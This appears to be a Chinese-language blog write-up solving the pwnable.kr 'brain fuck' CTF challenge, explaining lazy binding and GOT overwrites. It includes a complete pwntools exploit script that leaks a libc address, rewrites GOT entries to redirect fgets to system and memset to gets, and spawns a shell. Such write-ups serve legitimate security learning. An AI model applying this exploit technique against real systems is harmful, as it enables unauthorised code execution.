---
layout: post
title: pwnable.kr brain fuck
date: 2023-05-21 19:49 +0800
categories: [ctf, pwn]
tag: [pwnable.kr, stack]
---

## 题目描述
* 移动一个指针，次数最多1024次
* 可以逐字节修改GOT表
* 可以修改BSS的一些内容

## 解题思路
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
* 很明显的部分地址段任意读写，因此主要利用GOT覆写技术去操作。
* 由于延迟绑定，当我们调用一次putchar，在GOT表会记录putchar的真实地址，使用getchar逐字节泄漏他
* 根据libc获取offset，从而获得libc基地址
* 覆盖GOT表，主要任务如下
  * putchar -> main 使得我们能二次进入main程序
  * memset -> gets 读入`/bin/sh`
  * fgets -> system
* get shell


## 延迟绑定
```
											      GOT
                      +--------------+
      ELF          +> | puts@glibc   +---+        GLIBC
+-------------+    |  +--------------+   |   +--------------+
|             +-+  |  | printf@glibc |   |   |              |
| call <puts> | |  |  +--------------+   +-> | puts entry   |
|             | |  |  | scanf@glibc  |       |              |
+-------------+ |  |  +--------------+       +--------------+
                |  |  |     ...      |
                |  |  +--------------+
                |  |
 +--------------+  +-------+
 |                         |
 |    +-----------------+  |
 +--> | puts@plt        |  |
      +-----------------+  |
      | jmp   *puts@got +--+
      | push  puts_id   |
      | jmp   resolver  |
      +-----------------+
      |       ...       |
      +-----------------+
```

{: .prompt-info }
> 完成延迟绑定的关键就在于三条指令中的后两句。在程序编译的时候，编译器会在函数对应的GOT表中填入一个初始值，这个初始值会被设置成对应PLT项中第二句指令的地址。这会使得：当程序第一次调用某一函数时，程序会运行到PLT的第一条指令，取出GOT表中的值并跳转过去，而此时GOT表中的值指向了第二条指令，所以这个跳转相当于顺序执行了第二条指令。这时第二条指令就会将对应的符号表序号压入堆栈，并在第三条指令跳转到一个resolver的入口，resolver会：

{: .prompt-tip }
> - 根据堆栈中符号表的序号解析出对应函数的真实地址
> - 将真实地址填入GOT表中，替换掉一开始的初始值
> - 跳转到对应函数，并继续执行，调用结束后可以直接返回到调用的地方

如此，程序就顺利的调用了所需要的函数，同时GOT表中的地址也变成了真实的函数地址。此后，如果程序再次调用相同的函数，因为GOT表中的地址已经被替换，则PLT中的第一条指令就可以直接让程序跳转到目标函数。
## 解题脚本
```python
from pwn import *
from ctypes import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./bf')
libc = ELF('./bf_libc.so')
# p = process('./bf')
p = remote('pwnable.kr',9001)

def debug(cmd=""):
    gdb.attach(p, cmd)
    pause()

putchar_got_addr = elf.got['putchar']
fgets_got_addr = elf.got['fgets']
memset_got_addr = elf.got['memset']
puts_got_addr = elf.got['puts']

system_libc_offset = libc.symbols['system']
putchar_libc_offset = libc.symbols['putchar']
memset_libc_offset = libc.symbols['memset']
puts_libc_offset = libc.symbols['puts']
gets_libc_offset = libc.symbols['gets']

tape_addr = 0x0804A0A0
main_addr = 0x08048671 

data = flat(
    [   b'.',
        # leak
        (tape_addr - putchar_got_addr) * b'<',
        b'.>' * 4,
        # modify fgets to system
        (4 + putchar_got_addr - fgets_got_addr) * b'<',
        b',>,>,>,>',
        
        # modify memset to gets
        (memset_got_addr - puts_got_addr + 4) * b'>',
        b',>,>,>,>',
        
        # modify putchar to main
        b',>,>,>,>.',
    ]
)

print(len(data))

p.sendlineafter(b"[ ]",data)
p.recvuntil(b"\x00")

putchar_real_addr = struct.unpack('I',p.recv(4))[0]
libc_base_addr = putchar_real_addr - putchar_libc_offset
log.success(f"[system]{hex(system_libc_offset+libc_base_addr)}")
log.success(f"[gets]{hex(libc_base_addr + gets_libc_offset)}")

p.sendline(p32(system_libc_offset+libc_base_addr) + p32(libc_base_addr + gets_libc_offset) + p32(main_addr) + b'/bin/sh\x00') # /bin/sh 必须紧跟 否则换行还在缓冲区中，gets将读不到任何内容
p.interactive()
```

